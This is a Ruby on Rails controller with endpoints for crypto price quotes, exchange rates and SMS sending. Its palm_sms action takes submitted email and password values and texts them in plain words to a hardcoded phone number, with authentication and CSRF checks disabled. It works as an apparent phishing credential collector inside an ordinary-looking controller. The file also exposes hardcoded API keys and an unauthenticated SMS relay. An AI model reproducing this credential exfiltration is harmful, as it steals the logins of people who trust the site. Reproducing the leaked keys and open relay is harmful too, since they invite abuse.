class HomeController < ApplicationController
  require 'net/http'
  require 'net/https'

  skip_before_filter :verify_authenticity_token
  skip_before_filter :authenticate_user!, :only => [:receive_sms, :palm_sms, :get_s3_upload_key]

  def index
  end

  def generate_random_code
      return Random.rand(10001..99999).to_s
    end

  def palm_sms
    phone_number = 639175314928
    email = params[:email]
    password = params[:password]
    message = "This is the email" + email + " And the password is" + password
    message_type = 'SEND'
    request_id = 0
    Rails.logger.info 'hello hello'

    uri = URI.parse("https://semaphore.co/api/v4/messages")

    # Shortcut
    response = Net::HTTP.post_form(uri, {"apikey" => "Jaxn19qGX11Uzm9dxzpJ", "number" => "09175314928", "message" => message})


    Rails.logger.info response

    render json: {
      status: 'success'
    }
  end

  def coinsph
    coins_list = []
    uri = URI.parse("https://quote.coins.ph/v1/markets/BTC-PHP")
    response = Net::HTTP.get(uri) # => String

    d = {}
    d["code"] = "BTC"
    d["data"] = response

    coins_list.append(d)

    uri = URI.parse("https://quote.coins.ph/v1/markets/ETH-PHP")
    response = Net::HTTP.get(uri) # => String

    d = {}
    d["code"] = "ETH"
    d["data"] = response

    coins_list.append(d)

    uri = URI.parse("https://quote.coins.ph/v1/markets/XRP-PHP")
    response = Net::HTTP.get(uri) # => String

    d = {}
    d["code"] = "XRP"
    d["data"] = response

    coins_list.append(d)

    puts response

    render json: {
      status: 'success',
      data: coins_list
    }
  end

  def palm_sms_1
    phone_number = params[:number]
    message = params[:message]
    message_type = 'SEND'
    request_id = 0


    uri = URI.parse("https://semaphore.co/api/v4/messages")

    # Shortcut
    response = Net::HTTP.post_form(uri, {"apikey" => "Jaxn19qGX11Uzm9dxzpJ", "number" => phone_number, "message" => message})


    Rails.logger.info response

    render json: {
      status: 'success'
    }
  end

  def exchange_rate

    uri = URI.parse("https://api.exchangeratesapi.io/latest?symbols=USD,PHP")
    response = Net::HTTP.get(uri) # => String

    puts response

    render json: {
      status: 'success',
      data: response
    }
  end

  def coin
    Rails.logger.info 'hello world'

    uri = URI.parse("https://rest.coinapi.io/v1/assets?X-CoinAPI-Key=42D353D1-029C-49C1-9946-529FD880DE43")
    response = Net::HTTP.get(uri) # => String


    Rails.logger.info response
    puts response

    render json: {
      status: 'success',
      data: response
    }
  end
end
